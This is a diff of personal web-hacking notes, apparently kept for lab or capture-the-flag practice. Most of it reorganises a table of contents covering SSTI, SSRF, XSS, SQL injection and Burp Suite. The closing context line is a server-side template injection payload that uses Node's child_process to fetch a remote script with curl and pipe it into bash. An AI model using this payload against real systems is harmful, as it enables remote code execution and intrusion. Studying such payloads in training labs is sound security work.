@@ -1,32 +1,12 @@
-- [[#Server Side Template Injection|Server Side Template Injection]]
-- [[#Subdomain|Subdomain]]
-- [[#Wildcards|Wildcards]]
-- [[#User enumeration|User enumeration]]
-- [[#IDOR|IDOR]]
-- [[#File inclusion|File inclusion]]
-- [[#SSRF|SSRF]]
-- [[#XSS|XSS]]
-- [[#Websocket|Websocket]]
-- [[#Command injection|Command injection]]
-- [[#Authentication|Authentication]]
-- [[#DATABASE|DATABASE]]
-	- [[#DATABASE#Steps|Steps]]
-	- [[#DATABASE#UNION|UNION]]
-		- [[#UNION#Find data oracle|Find data oracle]]
-	- [[#DATABASE#blind|blind]]
-		- [[#blind#binary|binary]]
-			- [[#binary#sqlmap|sqlmap]]
-			- [[#binary#Provoking errors|Provoking errors]]
-		- [[#blind#Time|Time]]
-- [[#Repeater|Repeater]]
-- [[#Intruder|Intruder]]
-	- [[#Intruder#Macros|Macros]]
-- [[#Decoder, Comparer, Sequencer|Decoder, Comparer, Sequencer]]
-- [[#Wordpres|Wordpres]]
-- [[#Git Enumeration|Git Enumeration]]
+- [Burpsuite](#burpsuite)
+  - [Repeater](#repeater)
+  - [Intruder](#intruder)
+    - [Macros](#macros)
+  - [Decoder, Comparer, Sequencer](#decoder-comparer-sequencer)
+  - [Wordpres](#wordpres)
+- [API](#api)
+  - [Git Enumeration](#git-enumeration)
 
-
-# Web hacking
 
 ## Server Side Template Injection
 #{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl 10.9.1.255:5556/s.sh | bash')}()}
